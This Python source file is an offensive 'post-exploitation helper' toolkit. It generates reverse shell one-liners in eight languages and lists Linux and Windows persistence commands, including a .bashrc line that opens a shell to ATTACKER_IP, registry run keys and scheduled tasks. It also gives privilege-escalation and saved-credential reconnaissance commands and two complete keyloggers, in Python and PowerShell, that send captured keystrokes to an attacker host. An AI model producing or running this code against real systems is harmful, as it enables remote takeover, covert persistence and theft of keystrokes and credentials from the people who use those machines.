#!/usr/bin/env python3
"""
Post-Exploitation Helper - Core functions for post-exploitation
"""

class PostExploitHelper:
    """Helper functions for post-exploitation operations"""
    
    @staticmethod
    def generate_reverse_shell(ip, port, shell_type='bash'):
        """Generate reverse shell payloads"""
        
        shells = {
            'bash': f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            'nc': f"nc -e /bin/sh {ip} {port}",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            'telnet': f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF"
        }
        
        return shells.get(shell_type, shells['bash'])
    
    @staticmethod
    def generate_persistence_linux():
        """Generate Linux persistence mechanisms"""
        
        return {
            'cron': {
                'description': 'Add cron job for persistence',
                'command': '(crontab -l; echo "@reboot /tmp/.backdoor") | crontab -',
                'location': '/var/spool/cron/crontabs/<user>',
                'cleanup': 'crontab -r'
            },
            'systemd': {
                'description': 'Create systemd service',
                'service_file': '''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/backdoor
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target''',
                'install': 'systemctl enable backdoor.service && systemctl start backdoor.service',
                'location': '/etc/systemd/system/backdoor.service',
                'cleanup': 'systemctl disable backdoor.service && systemctl stop backdoor.service'
            },
            'bashrc': {
                'description': 'Inject into .bashrc',
                'command': 'echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &" >> ~/.bashrc',
                'location': '~/.bashrc',
                'cleanup': 'sed -i "/bash -i/d" ~/.bashrc'
            },
            'ssh_key': {
                'description': 'Add SSH authorized key',
                'command': 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys',
                'location': '~/.ssh/authorized_keys',
                'cleanup': 'Remove the added key from authorized_keys'
            },
            'profile': {
                'description': 'Inject into /etc/profile',
                'command': 'echo "/tmp/.backdoor &" >> /etc/profile',
                'location': '/etc/profile',
                'cleanup': 'sed -i "/.backdoor/d" /etc/profile'
            }
        }
    
    @staticmethod
    def generate_persistence_windows():
        """Generate Windows persistence mechanisms"""
        
        return {
            'registry_run': {
                'description': 'Registry Run Key',
                'command': 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /d "C:\\backdoor.exe" /f',
                'location': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'cleanup': 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /f'
            },
            'startup_folder': {
                'description': 'Startup Folder',
                'command': 'copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"',
                'location': '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                'cleanup': 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"'
            },
            'scheduled_task': {
                'description': 'Scheduled Task',
                'command': 'schtasks /create /tn "SystemUpdate" /tr "C:\\backdoor.exe" /sc onlogon /ru System',
                'location': 'Task Scheduler',
                'cleanup': 'schtasks /delete /tn "SystemUpdate" /f'
            },
            'wmi_event': {
                'description': 'WMI Event Subscription',
                'command': 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
                'location': 'WMI Repository',
                'cleanup': 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter WHERE Name="Updater" DELETE'
            }
        }
    
    @staticmethod
    def generate_privesc_linux():
        """Generate Linux privilege escalation checks"""
        
        return {
            'sudo_check': {
                'command': 'sudo -l',
                'description': 'Check sudo permissions'
            },
            'suid_binaries': {
                'command': 'find / -perm -4000 -type f 2>/dev/null',
                'description': 'Find SUID binaries'
            },
            'writable_etc': {
                'command': 'find /etc -writable -type f 2>/dev/null',
                'description': 'Find writable files in /etc'
            },
            'cron_jobs': {
                'command': 'cat /etc/crontab; ls -la /etc/cron.*',
                'description': 'Check cron jobs'
            },
            'kernel_exploits': {
                'command': 'uname -a',
                'description': 'Check kernel version for exploits'
            },
            'capabilities': {
                'command': 'getcap -r / 2>/dev/null',
                'description': 'Find files with capabilities'
            },
            'nfs_exports': {
                'command': 'cat /etc/exports 2>/dev/null',
                'description': 'Check NFS exports for no_root_squash'
            },
            'docker_socket': {
                'command': 'ls -la /var/run/docker.sock',
                'description': 'Check if Docker socket is accessible'
            }
        }
    
    @staticmethod
    def generate_privesc_windows():
        """Generate Windows privilege escalation checks"""
        
        return {
            'whoami': {
                'command': 'whoami /all',
                'description': 'Check current user privileges'
            },
            'unquoted_service': {
                'command': 'wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\"',
                'description': 'Find unquoted service paths'
            },
            'always_install_elevated': {
                'command': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                'description': 'Check AlwaysInstallElevated registry'
            },
            'scheduled_tasks': {
                'command': 'schtasks /query /fo LIST /v',
                'description': 'List scheduled tasks'
            },
            'saved_credentials': {
                'command': 'cmdkey /list',
                'description': 'List saved credentials'
            },
            'registry_autologon': {
                'command': 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'description': 'Check registry for autologon credentials'
            },
            'service_permissions': {
                'command': 'sc query state= all',
                'description': 'List all services'
            }
        }
    
    @staticmethod
    def generate_keylogger_python():
        """Generate Python keylogger"""
        
        return '''#!/usr/bin/env python3
# Python Keylogger
from pynput import keyboard
import socket
import threading
import time

ATTACKER_IP = "CHANGE_ME"
ATTACKER_PORT = 4444
LOG_INTERVAL = 60

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\\n"
        else:
            log += f" [{key}] "

def send_logs():
    global log
    while True:
        time.sleep(LOG_INTERVAL)
        if log:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ATTACKER_IP, ATTACKER_PORT))
                s.send(log.encode())
                s.close()
                log = ""
            except:
                pass

send_thread = threading.Thread(target=send_logs, daemon=True)
send_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
'''
    
    @staticmethod
    def generate_keylogger_powershell():
        """Generate PowerShell keylogger"""
        
        return '''# PowerShell Keylogger
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);'
$API_Type = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

$LogFile = "$env:TEMP\\keylog.txt"
$AttackerIP = "CHANGE_ME"
$AttackerPort = 4444

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 8; $i -le 190; $i++) {
        if ($API_Type::GetAsyncKeyState($i) -eq -32767) {
            $key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i)
            Add-Content $LogFile $key
            
            if ((Get-Content $LogFile).Length -gt 100) {
                try {
                    $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $AttackerPort)
                    $stream = $client.GetStream()
                    $data = Get-Content $LogFile -Raw
                    $bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
                    $stream.Write($bytes, 0, $bytes.Length)
                    $stream.Close()
                    $client.Close()
                    Clear-Content $LogFile
                } catch {}
            }
        }
    }
}
'''
